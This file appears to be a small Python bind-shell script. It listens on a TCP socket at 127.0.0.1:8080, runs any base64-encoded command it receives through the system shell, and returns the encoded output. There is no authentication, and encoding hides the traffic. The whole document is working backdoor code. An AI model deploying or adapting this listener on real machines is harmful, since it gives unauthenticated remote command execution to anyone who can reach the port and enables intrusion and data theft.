import base64
import socket
import subprocess
import hashlib

Host= "127.0.0.1"
Port= 8080

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((Host, Port))
print("Socket bind complete")
print("Socket listening complete")
s.listen()
conn, addr = s.accept()
while True:
    print("Connected by", addr)
    command = (base64.b64decode(conn.recv(1024)).decode('utf-8'))

    if command == "exit":
        conn.close()
        break
    else:
        try:
            data = (subprocess.check_output(command, shell=True, text=True)).encode()
            print("sent " + data.decode())
            conn.send(base64.b64encode(data))
        except subprocess.CalledProcessError as e:
            print(e)
            conn.send(base64.b64encode(b"Error please enter a solid command"))



